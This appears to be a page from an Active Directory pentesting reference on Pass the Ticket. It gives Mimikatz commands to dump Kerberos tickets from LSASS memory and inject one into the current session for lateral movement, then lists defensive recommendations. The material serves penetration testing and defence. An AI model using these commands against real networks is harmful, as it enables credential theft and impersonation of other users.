---
layout: default
title: Pass the Ticket
parent: Active Directory
nav_order: 12
permalink: /ad/passtheticket/
---

# Pass the Ticket
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If you gain local administrator rights on a domain joined computer, you can take advantage of this situation to extract Kerberos tickets and import them in your current session to impersonate a user. By doing this, you could be able to lateralize on the network and access other services protected with Kerberos authentication.

## Prerequisites

* Local administrator rights on a domain joined computer.

## Exploit

You can use `Mimikatz` to extract all TGT/TGS Kerberos tickets from LSASS memory space of a domain joined computer on which you have local administrator rights. Exported tickets are then stored in a `.kirbi` format.

```bash
# With Mimikatz.
privilege::debug
sekurlsa::tickets /export
dir *.kirbi
```

You can now choose the TGS ticket you want to import in your session. TGS format is something like **`[0;12bd0]-0-0-40810000-<$username>@cifs-<$target>.kirbi`.** To inject it, use `Mimikatz` again.

```bash
# With Mimikatz
kerberos::ptt [0;12bd0]-0-0-40810000-<$username>@cifs-<$target>.kirbi

# List current Kerberos tickets to check injection worked
klist
```

You can now take advantage of this ticket to lateralize on the network by impersonating the corresponding account.

## Recommendations

- [ ] Enable additional LSA Protection. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.
- [ ] Enforce EDR on computers to detect and prevent Mimikatz usage.